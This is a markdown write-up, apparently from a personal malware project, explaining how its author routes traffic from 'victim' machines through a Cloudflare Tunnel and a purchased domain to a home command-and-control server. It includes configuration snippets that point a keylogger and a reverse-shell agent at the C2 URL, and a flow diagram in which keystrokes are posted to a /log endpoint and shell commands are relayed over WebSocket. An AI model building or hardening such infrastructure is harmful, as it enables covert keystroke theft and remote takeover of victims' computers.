# Project Cerberus — Cloudflare Tunnel & Domain Setup Explained

## The Core Problem

My C2 server (`server.py`) runs on my home machine. For a victim machine to send keystrokes or connect a reverse shell to it, it needs to reach my machine over the internet.

The problem: **my ISP blocks all inbound connections.** Nobody from the internet can knock on my door - the ISP slams it shut before the request even reaches my router.

---

## Why a Simple DNS Record Doesn't Work

I already had a DuckDNS domain (`retrodomain.duckdns.org`). DuckDNS is a free dynamic DNS service  - it just maps a domain name to my public IP address. So `retrodomain.duckdns.org` → `87.71.155.173` (my public IP).

But DNS alone just tells the victim *where* to knock. It doesn't help if the ISP is still blocking the door. The victim's request reaches my router and dies there.

---

## What Cloudflare Tunnel Does

Cloudflare Tunnel flips the model entirely. Instead of waiting for inbound connections, **my machine reaches outward to Cloudflare first.**

Here's the flow:

```
My machine → (outbound connection) → Cloudflare's edge servers
```

Because my machine initiated this connection, my ISP doesn't block it - outbound traffic is always allowed. Cloudflare holds this connection open permanently.

Now when a victim connects to my domain:

```
Victim → c2.sysmonitor.homes → Cloudflare edge → tunnel → my machine → server.py
```

Cloudflare acts as the middleman. No inbound ports need to be open on my machine at all. The tunnel punches through my ISP's block completely.

---

## Why I Need a Domain

Cloudflare needs a domain it controls the DNS for in order to route traffic through the tunnel. Without a domain, Cloudflare has no address to attach the tunnel endpoint to - there's nowhere to point the victim.

This is why the free `trycloudflare.com` approach has a rotating URL - Cloudflare generates a temporary random subdomain because I hadn't given it a real domain to use permanently. The moment the tunnel restarts, the random subdomain changes.

With my own domain (`sysmonitor.homes`), Cloudflare owns the DNS and can permanently point `c2.sysmonitor.homes` at my tunnel. It never changes.

---

## Why I Bought from Porkbun Instead of Cloudflare

Cloudflare Registrar sells domains at wholesale cost with no markup - genuinely the cheapest option. However, their payment processor blocked some regions cards. Porkbun worked fine and is also cheap, so I registered `sysmonitor.homes` there for $1.54.

---

## What "Nameservers" Means and Why I Changed Them

When I registered the domain at Porkbun, Porkbun controlled its DNS by default - meaning Porkbun decided what IP address `sysmonitor.homes` resolves to. Their nameservers handle all DNS queries.

For Cloudflare Tunnel to work, **Cloudflare needs to control the DNS.** So I pointed the domain's nameservers from Porkbun's servers to Cloudflare's:

- Removed: `curitiba.ns.porkbun.com`, `fortaleza.ns.porkbun.com`, etc.
- Added: `abby.ns.cloudflare.com`, `donald.ns.cloudflare.com`

Now when anyone looks up `sysmonitor.homes`, the internet asks Cloudflare's nameservers for the answer instead of Porkbun's. Cloudflare can point it wherever it wants —-including my tunnel.

DNS propagation (the process of the internet learning about this nameserver change) takes anywhere from a few minutes to 48 hours depending on caching.

---

## The Port Situation - 5000 vs 443

This is a common point of confusion. Here's the full picture:


| Where                       | Port               | Why                                                        |
| --------------------------- | ------------------ | ---------------------------------------------------------- |
| `server.py` on my machine   | **5000**           | Flask runs here locally, always has                        |
| Cloudflare Tunnel route     | **localhost:5000** | Tunnel knows to forward traffic to port 5000               |
| Victim connecting to domain | **443**            | Standard HTTPS port, what browsers/requests use by default |
| `C2_PORT` in `config.py`    | **443**            | Reflects what the victim uses to connect                   |


The tunnel handles the translation. Victim hits port 443 on Cloudflare → Cloudflare sends it through the tunnel → arrives at `localhost:5000` on my machine. My Flask server never knows or cares about 443.

**This is why** `server.py` **stays on port 5000** - changing it to 443 would break things because:

1. Binding to port 443 requires administrator privileges
2. The tunnel is already configured to forward to 5000
3. 443 is Cloudflare's job, not Flask's

---

## The config.py Changes

**Before:**

```python
C2_HOST = "retrodomain.duckdns.org"
C2_PORT = 443
C2_URL = f"{C2_HOST}:{C2_PORT}{C2_ENDPOINT}"  # retrodomain.duckdns.org:443/log
```

**After:**

```python
C2_HOST = "https://c2.sysmonitor.homes"
C2_PORT = 443
C2_URL = f"{C2_HOST}{C2_ENDPOINT}"  # https://c2.sysmonitor.homes/log
```

Key difference: the port is **not appended to the URL**. When I use `https://`, port 443 is already implied by the scheme — appending `:443` is redundant and can confuse some HTTP libraries. Cloudflare handles it transparently.

---

## The shell_agent.py Change

**Before:**

```python
C2_URL = f"{C2_HOST}:{C2_PORT}"  # retrodomain.duckdns.org:443
```

**After:**

```python
C2_URL = C2_HOST  # https://c2.sysmonitor.homes
```

Same reason - port is implied by `https://`, no need to append it. The WebSocket connection (`python-socketio`) will automatically use `wss://` (secure WebSocket) when it sees an `https://` URL.

---

## The cloudflared Windows Service

`cloudflared.exe` is the Cloudflare Tunnel client. When installed as a Windows service it:

- Starts automatically on boot (no manual intervention needed)
- Runs in the background with no visible window
- Maintains the persistent outbound connection to Cloudflare's edge
- Automatically reconnects if the connection drops

I installed it with:

```
cloudflared.exe service install <token>
```

The token is a credential that tells Cloudflare which tunnel this instance belongs to. It's generated in the Zero Trust dashboard when I create a tunnel.

---

## Full Traffic Flow (Final State)

```
Victim machine
    │
    │  POST https://c2.sysmonitor.homes/log  (keystrokes)
    │  WS   https://c2.sysmonitor.homes      (reverse shell)
    ▼
Cloudflare Edge (port 443)
    │
    │  Cloudflare Tunnel (persistent outbound connection)
    ▼
My machine — cloudflared.exe
    │
    │  forwards to localhost:5000
    ▼
server.py (Flask + SocketIO)
    │
    ├── stores keystrokes in SQLite
    └── relays shell commands/output via WebSocket
```

